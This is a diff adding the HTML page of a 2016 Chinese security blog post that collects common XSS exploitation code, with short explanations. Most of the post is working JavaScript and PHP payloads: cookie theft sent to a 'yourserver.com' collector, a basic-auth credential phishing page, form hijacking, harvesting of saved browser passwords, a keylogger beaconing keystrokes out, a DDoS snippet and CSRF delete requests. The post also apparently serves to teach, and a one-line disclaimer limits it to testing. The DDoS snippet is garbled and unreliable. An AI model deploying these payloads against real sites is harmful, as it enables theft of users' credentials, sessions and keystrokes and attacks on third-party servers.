@@ -1,0 +1,727 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="xss," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="wps2015的博客" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="XSS是一种经常出现在Web应用中的计算机安全漏洞，它允许恶意Web用户将代码植入到提供给其它用户使用的页面中。常见的利用方式有cookie获取、基础认证钓鱼、表单劫持等。通常，在发现XSS漏洞后，会利用跨站平台里面的payload来进行攻击。但是，要更好的理解XSS的危害，还是需要自己动手来写并理解XSS的攻击代码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS常见利用代码及原理">
+<meta property="og:url" content="http://wps2015.org/2016/11/29/usually-used-xss-code/index.html">
+<meta property="og:site_name" content="wps2015的博客">
+<meta property="og:description" content="XSS是一种经常出现在Web应用中的计算机安全漏洞，它允许恶意Web用户将代码植入到提供给其它用户使用的页面中。常见的利用方式有cookie获取、基础认证钓鱼、表单劫持等。通常，在发现XSS漏洞后，会利用跨站平台里面的payload来进行攻击。但是，要更好的理解XSS的危害，还是需要自己动手来写并理解XSS的攻击代码。">
+<meta property="og:updated_time" content="2016-12-12T01:45:16.536Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS常见利用代码及原理">
+<meta name="twitter:description" content="XSS是一种经常出现在Web应用中的计算机安全漏洞，它允许恶意Web用户将代码植入到提供给其它用户使用的页面中。常见的利用方式有cookie获取、基础认证钓鱼、表单劫持等。通常，在发现XSS漏洞后，会利用跨站平台里面的payload来进行攻击。但是，要更好的理解XSS的危害，还是需要自己动手来写并理解XSS的攻击代码。">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 6272967343840691000,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> XSS常见利用代码及原理 | wps2015的博客 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?65b1db686913b39658c3aa88f2765a8d";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">wps2015的博客</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-drops">
+          <a href="/drops" rel="section">
+            
+            menu.drops
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                XSS常见利用代码及原理
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-11-29T00:00:00+08:00" content="2016-11-29">
+              2016-11-29
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/29/usually-used-xss-code/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/29/usually-used-xss-code/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>XSS是一种经常出现在Web应用中的计算机安全漏洞，它允许恶意Web用户将代码植入到提供给其它用户使用的页面中。常见的利用方式有cookie获取、基础认证钓鱼、表单劫持等。通常，在发现XSS漏洞后，会利用跨站平台里面的payload来进行攻击。但是，要更好的理解XSS的危害，还是需要自己动手来写并理解XSS的攻击代码。<a id="more"></a><br><strong>ps. 本文所涉及代码仅做测试使用，请不要用于非法用途！</strong></p>
+<h3 id="Cookie偷取"><a href="#Cookie偷取" class="headerlink" title="Cookie偷取"></a>Cookie偷取</h3><p>XSS最常见的手段大概就是获取Cookie了吧。</p>
+<ol>
+<li><p>javascript创建img标签，利用img的跨域请求将cookie信息传递到我们的服务器上</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cookie = <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="keyword">var</span> ele = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>); <span class="comment">//创建img标签</span></span><br><span class="line"><span class="keyword">var</span> time = <span class="keyword">new</span>  <span class="built_in">Date</span>();</span><br><span class="line">ele.src = <span class="string">"http://yourserver.com/xss/xss_cookie/cookie1.php?cookie="</span>+cookie+<span class="string">"&amp;location="</span>+<span class="built_in">window</span>.location.href+<span class="string">"&amp;time="</span>+time;  <span class="comment">//cookie获取</span></span><br><span class="line">ele.id = <span class="string">"imgs"</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ajax发起简单跨域请求</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xmlHttp;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Msxml2.XMLHTTP"</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">        xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> xmlHttp;</span><br><span class="line">&#125;</span><br><span class="line">xml = ajax(); <span class="comment">//实例化ajax请求对象</span></span><br><span class="line">url = <span class="string">"http://yourserver.com/xss/xss_cookie/cookie1.php?cookie="</span>+<span class="built_in">document</span>.cookie+<span class="string">"&amp;location="</span>+<span class="built_in">window</span>.location.href;</span><br><span class="line">xml.open(<span class="string">"GET"</span>,url,<span class="literal">true</span>);  <span class="comment">//若要传递的数据量较大，可利用 POST方法；xml.open("POST",url,true);xml.send("cookie="+cookie+"&amp;location="+locations);</span></span><br><span class="line">xml.send();</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="基础认证钓鱼"><a href="#基础认证钓鱼" class="headerlink" title="基础认证钓鱼"></a>基础认证钓鱼</h3><p>查了查资料，基础认证钓鱼在2012年流传比较广（那时我还只是孩子呀…），通常是你浏览着网站突然弹出一个基础认证的框。其实，所有可以利用标签插入外部资源的网站都可能存在这个漏洞。通常，在论坛等地方，可以自定义引用外部图片（其实就是利用img标签），将src链接到一个需要基础认证后才行访问的资源，那么就会产生弹窗。用你的路由器后台地址试试。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://192.168.1.1"</span>&gt;</span> //大家知道访问路由器后台，是需要基础认证的，这里可以试试</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>了解基础认证钓鱼的原理后，可以联想到XSS也是实现该漏洞的一种方式。这里先利用php构造一个基础认证页面fish.php，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'PHP_AUTH_PW'</span>] ==<span class="string">""</span> || $_SERVER[<span class="string">'PHP_AUTH_USER'</span>] ==<span class="string">""</span> ) </span><br><span class="line">&#123; </span><br><span class="line">header(<span class="string">'WWW-Authenticate: Basic realm="info you want"'</span>); <span class="comment">//自定义描述</span></span><br><span class="line">header(<span class="string">'HTTP/1.0 401 Unauthorized'</span>);                     <span class="comment">//401未认证</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">$user = $_SERVER[<span class="string">'PHP_AUTH_USER'</span>]; </span><br><span class="line">$pass = $_SERVER[<span class="string">'PHP_AUTH_PW'</span>]; </span><br><span class="line">$fish = <span class="string">"username:"</span>.$user.<span class="string">"  password:"</span>.$pass; </span><br><span class="line">header(<span class="string">"location:http://yourserver.com/fish_get.php?c=$fish"</span>); <span class="comment">//受害者在填写用户名和密码后，location跳转到密码接收页面</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>利用js构造img引用该资源（任何可以引用外部资源的标签，如script）<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src=<span class="string">"http://youserver.com/fish.php"</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="表单劫持"><a href="#表单劫持" class="headerlink" title="表单劫持"></a>表单劫持</h3><h5 id="劫持onsubmit方法"><a href="#劫持onsubmit方法" class="headerlink" title="劫持onsubmit方法"></a>劫持onsubmit方法</h5><p>在提交form表单时，通常会调用onsubmit方法。在onsubmit被调用时,说明表单中该填的项肯定都已经填好了,这时,我们通过修改onsubmit方法,便可以获取表单中的信息。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f=<span class="built_in">document</span>.forms[<span class="string">'myform'</span>];       <span class="comment">//获取form对象</span></span><br><span class="line"><span class="keyword">if</span>(f==<span class="literal">undefined</span>)</span><br><span class="line">&#123;</span><br><span class="line">        f=<span class="built_in">document</span>.getElementById(<span class="string">'formid'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> func=f.onsubmit;</span><br><span class="line">f.onsubmit=<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str=<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;f.elements.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		str+=f.elements[i].name+<span class="string">':'</span>+f.elements[i].value+<span class="string">'||'</span>; <span class="comment">//获取form中元素的值</span></span><br><span class="line">	&#125;</span><br><span class="line">	str=str.substr(<span class="number">0</span>,str.length<span class="number">-2</span>);</span><br><span class="line">	<span class="keyword">var</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">	img.src=<span class="string">'http://myserver.com/img.php?data='</span>+<span class="built_in">escape</span>(str)+<span class="string">'&amp;url='</span>+<span class="built_in">escape</span>(location.href);   <span class="comment">//将获取的明文密码传递出去</span></span><br><span class="line">	func(event);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h5 id="修改action指向"><a href="#修改action指向" class="headerlink" title="修改action指向"></a>修改action指向</h5><p>通过js将form表单中的action地址修改，也可偷取明文密码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f=<span class="built_in">document</span>.forms[<span class="string">'myform'</span>];</span><br><span class="line"><span class="keyword">if</span>(f==<span class="literal">undefined</span>)</span><br><span class="line">&#123;</span><br><span class="line">        f=<span class="built_in">document</span>.getElementById(<span class="string">'formid'</span>);</span><br><span class="line">&#125;</span><br><span class="line">f.action = <span class="string">"http://myserver.com/accept.php"</span>;  <span class="comment">//在 accept.php中接受POST过来的字段</span></span><br></pre></td></tr></table></figure></p>
+<p>但是这种方式容易被CSP拦截（限制action指向的页面所在域）</p>
+<h5 id="获取浏览器记住的明文密码"><a href="#获取浏览器记住的明文密码" class="headerlink" title="获取浏览器记住的明文密码"></a>获取浏览器记住的明文密码</h5><p>在用户登录时，浏览器通常会提示保存密码。点击保存后，下次再次访问该登录页面，浏览器会自动将保存的用户名和密码填充。所以，利用XSS在目标域下构建一个表单，若受害者在浏览器中保存了密码，那么便可以利用自动填充 的机制获取到明密码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_form</span>(<span class="params">user</span>) </span>&#123; <span class="comment">/*获取明文密码*/</span></span><br><span class="line">	<span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</span><br><span class="line">	<span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(f);</span><br><span class="line">	<span class="keyword">var</span> e1 = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span><br><span class="line">	e1.type = <span class="string">"text"</span>;</span><br><span class="line">	e1.name = e1.id = <span class="string">"username"</span>;</span><br><span class="line">	e1.value = user;</span><br><span class="line">	f.appendChild(e1);</span><br><span class="line">	<span class="keyword">var</span> e = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span><br><span class="line">	e.name = e.type = e.id = <span class="string">"password"</span>;</span><br><span class="line">	f.appendChild(e);</span><br><span class="line">	setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">		img.src = <span class="string">"http://yourserver.com/img.php?username="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"username"</span>).value + <span class="string">"&amp;password="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"password"</span>).value;</span><br><span class="line">	&#125;, <span class="number">3000</span>); <span class="comment">// 时间竞争</span></span><br><span class="line">&#125;</span><br><span class="line">create_form(<span class="string">''</span>);</span><br></pre></td></tr></table></figure></p>
+<p>当然这种方法也跟浏览器是否支持有关，作者在FireFox默认配置下测试成功，最新版chrome默认没有提示保存密码。该方法的详细介绍参考余弦大牛 <a href="http://blog.knownsec.com/2012/02/xss_hack-steal_pwd_of_browsers/" target="_blank" rel="external">XSS Hack：获取浏览器记住的明文密码</a></p>
+<h5 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h5><p>键盘记录在系统木马中经常出现，但是利用js也可获取在浏览器界面上键盘记录<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> keys=<span class="string">''</span>;</span><br><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    get = <span class="built_in">window</span>.event?event:e;</span><br><span class="line">    key = get.keyCode?get.keyCode:get.charCode;</span><br><span class="line">    key = <span class="built_in">String</span>.fromCharCode(key);</span><br><span class="line">    keys+=key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">new</span> Image().src = <span class="string">'http://yourserver.com/g.php?c='</span>+keys;  <span class="comment">//在服务器上接收</span></span><br><span class="line">    keys = <span class="string">''</span>;</span><br><span class="line">&#125;, <span class="number">1000</span>);  <span class="comment">//每间隔1秒向服务器传递键盘记录，并重置keys</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h3><p>利用js可以很轻易向外域发起请求，这个特性导致XSS被利用进行DDos攻击。YouTube、搜狐等流量巨大的网站，就曾经因为存储型XSS被攻击者利用进行大规模的DDos。这里用youtube事件中攻击代码作为参考：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src=<span class="string">"/imagename.png"</span> onload=<span class="string">"$.getScript("</span>http:<span class="comment">//c&amp;cdomain.com/index1.html")"&gt;//漏洞存在点位于头像处，头像加载后恶意js也被加载</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ddos</span>(<span class="params">url</span>)</span>&#123;</span><br><span class="line">$(<span class="string">"body"</span>).append(<span class="string">"&lt;iframe id="</span>ifr11323<span class="string">" style="</span>display:none;<span class="string">" src="</span>http:<span class="comment">//c&amp;cdomain.com/index2.html"&gt;&lt;/iframe&gt;")//加载一个隐藏iframe指向攻击者的设定页面</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;<span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>iframe<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">ddos(<span class="string">"http://www.target1.com/1.jpg"</span>,<span class="string">"http://www.target2.com/1.jpg"</span>);  <span class="comment">//攻击目标</span></span><br><span class="line">fucntion ddos(url1,url2)&#123;</span><br><span class="line"><span class="built_in">window</span>.setInterval()&#123;</span><br><span class="line">$.getScript(url1);</span><br><span class="line">$.getScript(url2);</span><br><span class="line">&#125;,<span class="number">1000</span>                   <span class="comment">//1秒钟发送一次get请求</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>事件详细请见<a href="http://thehackernews.com/2014/04/vulnerability-in-worlds-largest-site.html" target="_blank" rel="external">Vulnerability In Worlds’ Largest Site</a></p>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF（跨站请求伪造）并不依赖于XSS漏洞，但是XSS也是进行CSRF攻击的一种方式。对于GET型<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> action = <span class="keyword">new</span> Image();</span><br><span class="line">action.src = <span class="string">"http://www.target.com/index.php?action=delete&amp;id=123"</span>  <span class="comment">//删除某个值</span></span><br></pre></td></tr></table></figure></p>
+<p>POST型<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xmlHttp;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Msxml2.XMLHTTP"</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">        xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> xmlHttp;</span><br><span class="line">&#125;</span><br><span class="line">xml = ajax(); <span class="comment">//实例化ajax请求对象</span></span><br><span class="line">url = <span class="string">"http://www.target.com/index.php"</span>;</span><br><span class="line">xml.open(<span class="string">"POST"</span>,url,<span class="literal">true</span>)</span><br><span class="line">xml.send(<span class="string">"action=delete&amp;id=123"</span>);      <span class="comment">//删除某个值</span></span><br><span class="line">xml.send();</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag">#xss</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/11/08/the-test-of-Tar-extract-pathname-bypass/" rel="next" title="Tar解压路径绕过漏洞分析（CVE-2016-6321）">
+                <i class="fa fa-chevron-left"></i> Tar解压路径绕过漏洞分析（CVE-2016-6321）
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/11/29/usually-used-xss-code/"
+           data-title="XSS常见利用代码及原理" data-url="http://wps2015.org/2016/11/29/usually-used-xss-code/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://img.alicdn.com/imgextra/i3/792076116/TB2Z2f9oFXXXXXYXFXXXXXXXXXX_!!792076116.png"
+               alt="wps2015" />
+          <p class="site-author-name" itemprop="name">wps2015</p>
+          <p class="site-description motion-element" itemprop="description">关注安全</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">21</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/sowish" target="_blank" title="github">
+                  
+                    <i class="fa fa-globe"></i>
+                  
+                  github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
